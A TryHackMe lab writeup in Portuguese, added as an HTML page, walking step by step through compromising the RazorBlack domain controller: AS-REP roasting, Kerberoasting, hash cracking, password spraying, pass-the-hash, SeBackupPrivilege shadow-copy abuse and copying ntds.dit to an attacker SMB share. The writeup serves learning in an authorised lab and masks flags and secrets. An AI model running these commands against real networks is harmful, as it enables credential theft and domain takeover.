@@ -1,0 +1,382 @@
+<!DOCTYPE html>
+<html lang="pt">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>RazorBlack — TryHackMe Writeup | AlienSec</title>
+<link rel="stylesheet" href="../css/style.css">
+</head>
+<body>
+
+<nav class="topbar">
+  <div class="wrap">
+    <div class="brand">Alien<span>Sec</span></div>
+    <ul>
+      <li><a href="../index.html">Home</a></li>
+      <li><a href="../projetos/index.html">Projetos</a></li>
+      <li><a href="index.html">Writeups</a></li>
+      <li><a href="../index.html#contacto">Contacto</a></li>
+    </ul>
+  </div>
+</nav>
+<div class="wrap">
+
+  <a class="back-link" href="index.html">&larr; voltar aos writeups</a>
+
+  <header class="hero">
+    <div class="kicker">TryHackMe · Active Directory</div>
+    <h1>RazorBlack — do nmap ao Domain Admin</h1>
+    <div class="meta">Máquina: HAVEN-DC (Windows Server 2019, domínio raz0rblack.thm) · Resolvida por David · Kali Linux + Impacket</div>
+    <div class="tags">
+      <span class="tag">nmap</span>
+      <span class="tag">NFS</span>
+      <span class="tag">AS-REP Roasting</span>
+      <span class="tag">Kerberoasting</span>
+      <span class="tag">SeBackupPrivilege</span>
+      <span class="tag">diskshadow</span>
+      <span class="tag">secretsdump</span>
+      <span class="tag">Pass-the-Hash</span>
+    </div>
+  </header>
+
+  <p class="note">
+    Writeup da sala <strong>RazorBlack</strong> do TryHackMe: reconhecimento, abuso de NFS mal configurado,
+    AS-REP Roasting e Kerberoasting contra o domínio, troca de password aproveitando uma conta expirada,
+    extração do <code>ntds.dit</code> via shadow copy com <code>SeBackupPrivilege</code>, e finalmente
+    Pass-the-Hash até Domain Admin. As flags foram mascaradas de propósito — é contra as regras do TryHackMe
+    publicá-las em claro.
+  </p>
+
+  <!-- PASSO 1 -->
+  <section class="step">
+    <p class="step-title"><span class="badge">01</span> Preparar o /etc/hosts</p>
+    <pre class="cmd">sudo cat /etc/hosts</pre>
+    <p class="note">O <code>raz0rblack.thm</code> e o <code>HAVEN-DC</code> ficam apontados no <code>/etc/hosts</code> para o IP do alvo, para usar nomes em vez de IP solto em todos os comandos seguintes.</p>
+    <figure>
+      <img src="img/razorblack/page-01.jpg" alt="Conteúdo do /etc/hosts com as entradas de raz0rblack.thm e HAVEN-DC">
+      <figcaption>/etc/hosts apontado para o domínio raz0rblack.thm</figcaption>
+    </figure>
+  </section>
+
+  <!-- PASSO 2 e 3 -->
+  <section class="step">
+    <p class="step-title"><span class="badge">02–03</span> nmap completo ao controlador de domínio</p>
+    <pre class="cmd">nmap -sC -sV -p- 10.130.144.100</pre>
+    <p class="note">A scan completa (todas as portas) revela um Windows Server cheio de serviços típicos de um DC:
+      53 (DNS), 88 (Kerberos), 111 (rpcbind), 2049 (NFS), 389 (LDAP), 445 (SMB), 3389 (RDP), 5985 (WinRM) e 9389.
+      O próprio RDP entrega a identidade: domínio <strong>RAZ0RBLACK</strong>, máquina <strong>HAVEN-DC</strong>,
+      e o SMB exige message signing. Scan concluída em 159 segundos.</p>
+    <figure>
+      <img src="img/razorblack/page-02.jpg" alt="Resultado do nmap mostrando portas abertas incluindo Kerberos, NFS, LDAP e SMB">
+      <figcaption>nmap -sC -sV -p- ao HAVEN-DC</figcaption>
+    </figure>
+  </section>
+
+  <!-- PASSO 4 -->
+  <section class="step">
+    <p class="step-title"><span class="badge">04</span> NFS aberto a todos</p>
+    <pre class="cmd">showmount -e 10.130.144.100
+sudo mount -t nfs 10.130.144.100:/users /tmp/nfs</pre>
+    <p class="note">O <code>showmount</code> revela a exportação <code>/users</code> disponível para "everyone". Sem
+      <code>sudo</code> o <code>ls</code> dá "Permissão recusada"; com <code>sudo</code> aparecem dois ficheiros:
+      <code>employee_status.xlsx</code> e <code>sbradley.txt</code>.</p>
+    <figure>
+      <img src="img/razorblack/page-03.jpg" alt="Montagem da partilha NFS e listagem de ficheiros expostos">
+      <figcaption>Partilha NFS /users montada localmente</figcaption>
+    </figure>
+  </section>
+
+  <!-- PASSO 5 -->
+  <section class="step">
+    <p class="step-title"><span class="badge">05</span> AS-REP Roasting ao domínio</p>
+    <pre class="cmd">sudo impacket-GetNPUsers raz0rblack.thm/ -usersfile users.txt \
+  -no-pass -dc-ip 10.130.144.100 -format hashcat</pre>
+    <p class="note">Dos 4 utilizadores testados, só o <strong>twilliams</strong> não tem Kerberos pre-authentication
+      ativado, e o GetNPUsers devolve o hash AS-REP dele, pronto para quebrar offline.</p>
+    <figure>
+      <img src="img/razorblack/page-04.jpg" alt="GetNPUsers a extrair o hash AS-REP do utilizador twilliams">
+      <figcaption>AS-REP hash do twilliams extraído</figcaption>
+    </figure>
+  </section>
+
+  <!-- PASSO 6 e 7 -->
+  <section class="step">
+    <p class="step-title"><span class="badge">06–07</span> hashcat quebra o hash AS-REP</p>
+    <pre class="cmd">sudo hashcat -m 18200 hash.txt /usr/share/wordlists/rockyou.txt</pre>
+    <p class="note">Em modo 18200 (AS-REP), o hashcat recupera a password do twilliams a partir do rockyou.txt.
+      Status final: <em>Cracked, 1/1 (100%)</em>.</p>
+    <figure>
+      <img src="img/razorblack/page-05.jpg" alt="hashcat em modo 18200 quebrando o hash AS-REP com rockyou">
+      <figcaption>hashcat -m 18200 contra o hash do twilliams</figcaption>
+    </figure>
+  </section>
+
+  <!-- PASSO 8 e 9 -->
+  <section class="step">
+    <p class="step-title"><span class="badge">08–09</span> Password spray com crackmapexec</p>
+    <pre class="cmd">crackmapexec smb 10.130.144.100 -u users.txt -p '&lt;password-twilliams&gt;' --continue-on-success</pre>
+    <p class="note">O spray confirma as credenciais do twilliams e revela algo útil sobre outro utilizador:
+      <strong>sbradley</strong> responde <code>STATUS_PASSWORD_MUST_CHANGE</code> — a password dele está expirada
+      e pode ser trocada sem conhecer a antiga.</p>
+    <figure>
+      <img src="img/razorblack/page-06.jpg" alt="crackmapexec a validar credenciais via SMB em vários utilizadores">
+      <figcaption>Password spray via SMB com crackmapexec</figcaption>
+    </figure>
+  </section>
+
+  <!-- PASSO 10 e 11 -->
+  <section class="step">
+    <p class="step-title"><span class="badge">10–11</span> Reset de password do sbradley</p>
+    <pre class="cmd">impacket-changepasswd raz0rblack.thm/sbradley:'&lt;password-twilliams&gt;'@10.130.144.100 \
+  -newpass 'NovaPass123!'
+
+crackmapexec smb 10.130.144.100 -u sbradley -p 'NovaPass123!'</pre>
+    <p class="note">Aproveitando o <code>STATUS_PASSWORD_MUST_CHANGE</code>, o <code>impacket-changepasswd</code> troca
+      a password do sbradley sem precisar de a saber antes. O crackmapexec confirma as novas credenciais válidas no DC.</p>
+    <figure>
+      <img src="img/razorblack/page-07.jpg" alt="Reset da password do utilizador sbradley via impacket-changepasswd">
+      <figcaption>Troca de password aproveitando conta expirada</figcaption>
+    </figure>
+  </section>
+
+  <!-- PASSO 12 e 13 -->
+  <section class="step">
+    <p class="step-title"><span class="badge">12–13</span> smbmap revela a partilha "trash"</p>
+    <pre class="cmd">smbmap -H 10.130.144.100 -u sbradley -p 'NovaPass123!'
+smbclient //10.130.144.100/trash -U 'sbradley%NovaPass123!'</pre>
+    <p class="note">Além das partilhas normais (SYSVOL, NETLOGON, IPC$), aparece uma partilha extra chamada
+      <code>trash</code>, READ ONLY — "Files Pending for deletion". Dentro: <code>chat_log</code>,
+      <code>sbradley.txt</code> e um interessante <code>experiment_gone_wrong.zip</code>.</p>
+    <figure>
+      <img src="img/razorblack/page-08.jpg" alt="smbmap listando partilhas SMB incluindo a partilha trash">
+      <figcaption>Partilha "trash" encontrada com smbmap / smbclient</figcaption>
+    </figure>
+  </section>
+
+  <!-- PASSO 14 e 15 -->
+  <section class="step">
+    <p class="step-title"><span class="badge">14–15</span> Quebrar o zip e extrair o ntds.dit</p>
+    <pre class="cmd">fcrackzip -u -D -p /usr/share/wordlists/rockyou.txt experiment_gone_wrong.zip
+unzip experiment_gone_wrong.zip</pre>
+    <p class="note">O <code>fcrackzip</code> parte a password do zip logo à primeira tentativa com o rockyou.
+      Dentro do arquivo: <code>system.hive</code> e <code>ntds.dit</code> — nada menos que a base de dados de
+      passwords do domínio inteiro, esquecida numa partilha de "lixo".</p>
+  </section>
+
+  <!-- PASSO 16 e 17 -->
+  <section class="step">
+    <p class="step-title"><span class="badge">16–17</span> secretsdump local — primeiro dump de hashes</p>
+    <pre class="cmd">impacket-secretsdump -system system.hive -ntds ntds.dit LOCAL</pre>
+    <p class="note">O secretsdump decifra o NTDS.dit (encontra a PEK) e despeja os hashes NTLM e as chaves Kerberos
+      (AES256/AES128/DES) de todo o domínio — Administrator, HAVEN-DC$ e dezenas de utilizadores.</p>
+    <figure>
+      <img src="img/razorblack/page-10.jpg" alt="impacket-secretsdump a decifrar o ntds.dit e listar hashes NTLM">
+      <figcaption>Dump local do ntds.dit encontrado na partilha trash</figcaption>
+    </figure>
+  </section>
+
+  <!-- PASSO 18 e 19 -->
+  <section class="step">
+    <p class="step-title"><span class="badge">18–19</span> Pass-the-Hash para lvetrova e 1ª flag</p>
+    <pre class="cmd">evil-winrm -i 10.130.144.100 -u lvetrova -H &lt;hash-ntlm-lvetrova&gt;
+
+# dentro da shell:
+$cred = Import-Clixml C:\Users\lvetrova\lvetrova.xml
+$cred.GetNetworkCredential().Password</pre>
+    <p class="note">Com o hash NTLM do dump, o evil-winrm abre PowerShell como lvetrova sem precisar da password em
+      claro. Na pasta do utilizador há um <code>PSCredential</code> cifrado com DPAPI — descifrável no contexto do
+      próprio utilizador, revelando a primeira flag da sala.</p>
+    <p class="note"><strong>Flag:</strong> <span class="redacted">THM{●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●}</span> <em>(oculta de propósito)</em></p>
+  </section>
+
+  <!-- PASSO 20 e 21 -->
+  <section class="step fail">
+    <p class="step-title"><span class="badge">falhou</span> Tentativa com john no zip</p>
+    <pre class="cmd">zip2john experiment_gone_wrong.zip > zip.hash
+sudo john --wordlist=/usr/share/wordlists/rockyou.txt zip.hash</pre>
+    <p class="note"><strong>O que correu mal:</strong> a sessão do john correu até ao fim (<em>Session completed</em>)
+      sem quebrar nada. A solução já tinha vindo do <code>fcrackzip</code> mais cedo — fica registado o caminho que
+      não funcionou, para referência futura.</p>
+  </section>
+
+  <section class="step">
+    <p class="step-title"><span class="badge">21</span> Kerberoasting ao xyan1d3</p>
+    <pre class="cmd">sudo impacket-GetUserSPNs raz0rblack.thm/twilliams:'&lt;password&gt;' \
+  -dc-ip 10.130.144.100 -request</pre>
+    <p class="note">Com as credenciais do twilliams, o <code>GetUserSPNs -request</code> devolve o TGS do xyan1d3
+      (SPN <code>HAVEN-DC/xyan1d3.raz0rblack.thm:60111</code>, membro de Remote Management Users).</p>
+    <figure>
+      <img src="img/razorblack/page-12.jpg" alt="impacket-GetUserSPNs extraindo o TGS Kerberoastable do utilizador xyan1d3">
+      <figcaption>Kerberoasting ao xyan1d3 via GetUserSPNs</figcaption>
+    </figure>
+  </section>
+
+  <!-- PASSO 22 e 23 -->
+  <section class="step">
+    <p class="step-title"><span class="badge">22–23</span> hashcat parte o TGS e 2ª flag</p>
+    <pre class="cmd">hashcat -m 13100 tgs_hash.txt /usr/share/wordlists/rockyou.txt
+evil-winrm -u xyan1d3 -p '&lt;password-recuperada&gt;' -i 10.130.144.100</pre>
+    <p class="note">Em modo 13100 o hashcat quebra o TGS em apenas 6 segundos. A shell como xyan1d3 revela outro
+      PSCredential cifrado — e mais uma flag.</p>
+    <p class="note"><strong>Flag:</strong> <span class="redacted">THM{●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●}</span> <em>(oculta de propósito)</em></p>
+  </section>
+
+  <!-- PASSO 24-30 diskshadow saga -->
+  <section class="step">
+    <p class="step-title"><span class="badge">24</span> SeBackupPrivilege encontrado</p>
+    <pre class="cmd">whoami /priv</pre>
+    <p class="note">O ouro está aqui: o utilizador xyan1d3 tem <strong>SeBackupPrivilege</strong> ativo — permite
+      ler qualquer ficheiro no disco, incluindo o <code>ntds.dit</code> em uso pelo sistema, via shadow copy.</p>
+    <figure>
+      <img src="img/razorblack/page-13.jpg" alt="Saída de whoami /priv mostrando o privilégio SeBackupPrivilege ativo">
+      <figcaption>SeBackupPrivilege confirmado no token do xyan1d3</figcaption>
+    </figure>
+  </section>
+
+  <section class="step fail">
+    <p class="step-title"><span class="badge">falhou ×4</span> A saga do diskshadow</p>
+    <p class="note">Esta foi a parte mais trabalhosa da máquina — vale a pena registar os quatro erros seguidos
+      antes da solução:</p>
+    <pre class="cmd">1) diskshadow /s diskshadow.txt
+   → só imprime a ajuda do SET CONTEXT: o script gerado com echo + Out-File
+     não separava as linhas corretamente.
+
+2) robocopy /b z:\Windows\NTDS C:\Temp ntds.dit
+   → ERROR 3: o disco z: nem existia, porque a shadow copy nunca
+     chegou a ser criada.
+
+3) diskshadow /s C:\Temp\diskshadow.txt (script reescrito linha a linha
+   com Add-Content)
+   → novo erro: "The .cab metadata file cannot be stored in the current
+     working directory, because it is read-only." Faltava o SET METADATA.
+
+4) Get-Content C:\Temp\diskshadow.txt | Format-Hex
+   → confirma que as linhas do script estavam corretas; o problema
+     era mesmo a falta do SET METADATA, não a sintaxe.</pre>
+    <p class="note">Lição: o <code>diskshadow</code> precisa sempre de um diretório <em>writable</em> definido com
+      <code>SET METADATA</code> antes de qualquer <code>SET CONTEXT</code> ou <code>CREATE</code>.</p>
+  </section>
+
+  <section class="step">
+    <p class="step-title"><span class="badge">30–33</span> Shadow copy criada e ntds.dit copiado</p>
+    <pre class="cmd">set metadata C:\Temp\meta.cab
+set context persistent nowriters
+add volume c: alias xyan
+create
+expose %xyan% z:
+
+robocopy /b z:\Windows\NTDS C:\Temp ntds.dit
+robocopy /b z:\Windows\System32\config C:\Temp SYSTEM</pre>
+    <p class="note">Com o <code>SET METADATA</code> a apontar para um diretório gravável, a shadow copy é criada e
+      exposta como <code>z:\</code>. Dessa letra, o robocopy consegue copiar o <code>ntds.dit</code> (16&nbsp;MB) e
+      o hive <code>SYSTEM</code> (16,5&nbsp;MB) sem erros — <em>FAILED 0</em> nos dois.</p>
+    <figure>
+      <img src="img/razorblack/page-15.jpg" alt="diskshadow a criar a shadow copy com sucesso e a expor como unidade z">
+      <figcaption>Shadow copy criada com sucesso após corrigir o script</figcaption>
+    </figure>
+    <figure>
+      <img src="img/razorblack/page-16.jpg" alt="robocopy copiando o ntds.dit a partir da shadow copy">
+      <figcaption>ntds.dit copiado a partir de z:\Windows\NTDS</figcaption>
+    </figure>
+  </section>
+
+  <!-- PASSO 34-39 -->
+  <section class="step">
+    <p class="step-title"><span class="badge">34–39</span> Exfiltração e secretsdump final</p>
+    <pre class="cmd"># Na Kali:
+impacket-smbserver share /tmp/smb_share -smb2support
+
+# No DC (evil-winrm):
+copy C:\Temp\ntds.dit \\&lt;ip-kali&gt;\share\
+copy C:\Temp\SYSTEM \\&lt;ip-kali&gt;\share\
+
+# De volta na Kali:
+impacket-secretsdump -ntds /tmp/smb_share/ntds.dit -system /tmp/smb_share/SYSTEM LOCAL</pre>
+    <p class="note">Com um <code>impacket-smbserver</code> à escuta na Kali, os dois ficheiros são copiados
+      diretamente do DC. O secretsdump final, já com os ficheiros reais (não a cópia truncada da partilha trash),
+      devolve o hash NTLM completo do <strong>Administrator</strong> do domínio.</p>
+    <figure>
+      <img src="img/razorblack/page-18.jpg" alt="smbserver do Impacket a receber os ficheiros exfiltrados do DC">
+      <figcaption>ntds.dit e SYSTEM recebidos via SMB na Kali</figcaption>
+    </figure>
+    <figure>
+      <img src="img/razorblack/page-19.jpg" alt="secretsdump final revelando o hash NTLM do Administrator do domínio">
+      <figcaption>Hash NTLM do Administrator extraído do ntds.dit real</figcaption>
+    </figure>
+  </section>
+
+  <!-- PASSO 39 pth + 40 flag -->
+  <section class="step">
+    <p class="step-title"><span class="badge">39</span> Pass-the-Hash como Administrator — Domain Admin</p>
+    <pre class="cmd">evil-winrm -i 10.130.144.100 -u Administrator -H &lt;hash-ntlm-administrator&gt;</pre>
+    <p class="note">Com o hash em mãos, o evil-winrm confirma: <code>whoami</code> responde
+      <code>raz0rblack\administrator</code>. Domain Admin conseguido.</p>
+  </section>
+
+  <section class="step">
+    <p class="step-title"><span class="badge">40</span> Root flag codificada em hex</p>
+    <pre class="cmd">echo "&lt;payload-hex&gt;" | xxd -r -p</pre>
+    <p class="note">A root flag não estava em claro — vinha codificada em hexadecimal, com uma pequena mensagem a
+      brincar com quem chegasse até ali antes de a revelar.</p>
+    <p class="note"><strong>Flag:</strong> <span class="redacted">THM{●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●}</span> <em>(oculta de propósito)</em></p>
+  </section>
+
+  <!-- PASSO 41-48 stego meme -->
+  <section class="step fail">
+    <p class="step-title"><span class="badge">falhou</span> A pista falsa: "Top Secret"</p>
+    <pre class="cmd">strings top_secret.png | grep THM
+binwalk top_secret.png
+zsteg top_secret.png
+exiftool top_secret.png</pre>
+    <p class="note">Uma pasta <code>Top Secret</code> no <code>C:\Program Files</code> escondia um
+      <code>top_secret.png</code> de 449&nbsp;KB — parecia esteganografia óbvia. Testei
+      <code>strings</code>, <code>binwalk</code>, <code>zsteg</code> (que nem estava no PATH à primeira) e
+      <code>exiftool</code>: nada. <strong>Veredicto:</strong> era só um meme de um gorila a derreter, a dizer que
+      a forma de sair do vim é <code>:W</code>. Boa lição sobre não perseguir pistas falsas indefinidamente.</p>
+    <figure>
+      <img src="img/razorblack/page-22.jpg" alt="Imagem PNG revelando-se um meme de um gorila, sem dados escondidos">
+      <figcaption>top_secret.png — apenas uma trolha da sala</figcaption>
+    </figure>
+  </section>
+
+  <!-- PASSO 49 -->
+  <section class="step">
+    <p class="step-title"><span class="badge">49</span> A flag de utilizador escondida à vista</p>
+    <pre class="cmd">type "C:\Users\twilliams\definitely_..._not_a_flag.exe"</pre>
+    <p class="note">A flag de utilizador estava noutro sítio: um ficheiro com um nome propositadamente exagerado
+      (<em>definitely_definitely_..._not_a_flag.exe</em>) na pasta do twilliams. Um simples <code>type</code>
+      revela o conteúdo.</p>
+    <p class="note"><strong>Flag:</strong> <span class="redacted">THM{●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●}</span> <em>(oculta de propósito)</em></p>
+  </section>
+
+  <!-- PASSO 50 -->
+  <section class="step">
+    <p class="step-title"><span class="badge">50</span> Room concluída — 100%</p>
+    <p class="note">RazorBlack a 100%, Task 1 e Task 2 completas. Boot to root feito, do nmap inicial ao Domain Admin.</p>
+  </section>
+
+  <details class="lessons">
+    <summary>Notas rápidas — o que correu mal e como se resolveu</summary>
+    <ul>
+      <li><strong>GetNPUsers falhou</strong> por causa de um caminho relativo errado para o <code>users.txt</code> — o caminho absoluto resolveu.</li>
+      <li><strong>john não quebrou o zip</strong> — o <code>fcrackzip</code> resolveu em segundos.</li>
+      <li><strong>diskshadow falhou três vezes seguidas</strong>: linhas do script mal separadas, diretório do .cab sem permissão de escrita e, por fim, falta do <code>SET METADATA</code>. A solução foi reconstruir o script linha a linha com <code>Add-Content</code>, começando sempre por <code>SET METADATA</code>.</li>
+      <li>O <strong>"Top Secret"</strong> era um meme — nem <code>strings</code>, nem <code>zsteg</code>, nem <code>exiftool</code> deram nada. Nem toda a pista é esteganografia.</li>
+      <li>Os IPs do alvo mudam quando a máquina reinicia — vale a pena confirmar o IP atual antes de insistir num erro de rede.</li>
+    </ul>
+  </details>
+
+  <p class="disclaimer">
+    Writeup de uma sala do TryHackMe, resolvida em ambiente de laboratório autorizado. Flags e alguns valores
+    sensíveis (hashes completos, IPs, passwords) foram mascarados ou omitidos de propósito, conforme as regras da
+    plataforma. Técnicas descritas apenas para fins educativos — usar só em sistemas próprios ou com autorização
+    explícita.
+  </p>
+
+  <footer class="pagefoot">
+    <a href="index.html">&larr; voltar à lista de writeups</a> · <a href="../index.html">AlienSec</a>
+  </footer>
+
+</div>
+</body>
+</html>
